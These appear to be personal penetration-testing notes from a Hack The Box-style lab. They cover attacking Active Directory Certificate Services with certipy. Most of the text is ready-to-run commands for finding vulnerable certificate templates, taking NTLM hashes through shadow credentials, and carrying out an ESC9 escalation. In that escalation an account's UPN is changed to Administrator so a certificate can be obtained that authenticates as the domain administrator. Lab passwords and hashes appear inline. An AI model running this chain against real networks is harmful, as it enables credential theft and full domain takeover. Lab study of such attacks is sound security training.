After obtaining valid domain creds, it is always a good idea to check (adcs) actice directory certificate services.

1. first, try running this command with valid domain creds == certipy find -vulnerable -u judith.mader -p judith09 -dc-ip <domainip> -stdout

  ## the above command will list vulnerable CA templates

ALSO

1b. attempt running this command to get NTLM hashes from accounts you might have generic all over == certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41

2. this command saves the cert and the private key as a .pfx == certipy req -username john@domain.local -password deez -ca corp-DC-CA -target ca.corp.local -template User

3. this command turns the .pfx into a hash for possible winrm == certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb

IF YOU FIND A TEMPLETE VULNERABLE TO ESC9 FOLLOW THESE STEPS.

The attack from here is to change the userPrincipalName (or UPN) of the second account to Administrator. This is explicitly not Administrator@domain, as that would conflict with the legit administrator account.

When I request a certificate as the second account, the server will return one with the UPN Administrator and no SID.

When I use this certificate, Windows is nice enough to assume that domain is itâ€™s domain, and authenticate as administrator.

1. change the pwnded accounts upn to Administrator == certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41 

2. request a cert with your pwned account using the vuln template == certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41

3. set your account back to what it was == certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 

4. lastly, use the acquired template to get a hash for the administrator == certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
